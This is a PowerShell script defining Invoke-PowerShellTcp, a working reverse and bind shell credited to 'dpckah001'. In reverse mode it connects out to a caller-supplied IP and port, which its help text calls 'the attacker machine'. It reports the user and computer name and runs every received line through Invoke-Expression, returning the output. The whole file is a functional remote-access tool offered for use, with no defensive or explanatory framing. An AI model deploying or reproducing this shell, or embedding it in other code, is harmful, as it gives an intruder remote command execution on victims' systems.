function Invoke-PowerShellTcp {
    <#
    .SYNOPSIS
    This script is a reverse shell or bind shell utility developed by dpckah001.

    .DESCRIPTION
    This PowerShell script can be used to create an interactive reverse or bind shell 
    connection. When using the -Reverse switch, it connects back to a listener. 
    When using the -Bind switch, it listens for incoming connections.

    .PARAMETER IPAddress
    The IP address to connect to when using the -Reverse switch.

    .PARAMETER Port
    The port to connect to when using the -Reverse switch or to listen on when using the -Bind switch.

    .EXAMPLE
    PS > Invoke-PowerShellTcp -Reverse -IPAddress "192.168.1.100" -Port 4444
    Connects back to the attacker machine at the specified IP address and port.

    .EXAMPLE
    PS > Invoke-PowerShellTcp -Bind -Port 4444
    Listens for incoming connections on the specified port.

    .LINK
    For more information, see the documentation.
    #>

    [CmdletBinding(DefaultParameterSetName="reverse")]
    param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String] $IPAddress,  # IP address for reverse connection or bind listener

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int] $Port,          # Port for reverse connection or bind listener

        [Parameter(ParameterSetName="reverse")]
        [Switch] $Reverse,    # Switch for reverse connection mode

        [Parameter(ParameterSetName="bind")]
        [Switch] $Bind        # Switch for bind connection mode
    )

    # Initialize client or listener
    try {
        if ($Reverse) {
            # Attempt reverse connection to the specified IP and port
            Write-Host "Attempting reverse connection to $IPAddress:$Port..."
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
        } elseif ($Bind) {
            # Set up a listener on the specified port
            Write-Host "Setting up bind listener on port $Port..."
            $listener = [System.Net.Sockets.TcpListener]::new($Port)
            $listener.Start()
            $client = $listener.AcceptTcpClient()
            Write-Host "Connection accepted on port $Port."
        } else {
            throw "You must specify either -Reverse or -Bind switch."
        }
    } catch {
        Write-Error "Failed to establish connection: $_"
        return
    }

    # Get the data stream
    $stream = $client.GetStream()
    [byte[]]$buffer = New-Object byte[] 1024
    $encoding = [System.Text.ASCIIEncoding]::new()

    # Welcome message and initial prompt
    $welcomeMessage = "Windows PowerShell running as user $($env:username) on $($env:computername)`n"
    $promptMessage = 'PS ' + (Get-Location).Path + '> '
    
    try {
        # Send initial information to the client
        $stream.Write($encoding.GetBytes($welcomeMessage), 0, $welcomeMessage.Length)
        $stream.Write($encoding.GetBytes($promptMessage), 0, $promptMessage.Length)

        while ($true) {
            # Read command from the client
            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
            if ($bytesRead -le 0) { break }

            $data = $encoding.GetString($buffer, 0, $bytesRead).Trim()
            if ($data -eq 'exit') { break }  # Exit command from client

            # Execute the command received from the client
            try {
                $commandOutput = Invoke-Expression -Command $data 2>&1 | Out-String
            } catch {
                $commandOutput = "Error executing command: $_`n"
            }

            # Send command output back to the client
            $response = $commandOutput + 'PS ' + (Get-Location).Path + '> '
            $stream.Write($encoding.GetBytes($response), 0, $response.Length)
            $stream.Flush()
        }
    } catch {
        Write-Error "Error during communication or command execution: $_"
    } finally {
        # Close connection and listener
        $client.Close()
        if ($listener) {
            $listener.Stop()
        }
        Write-Host "Connection closed."
    }
}
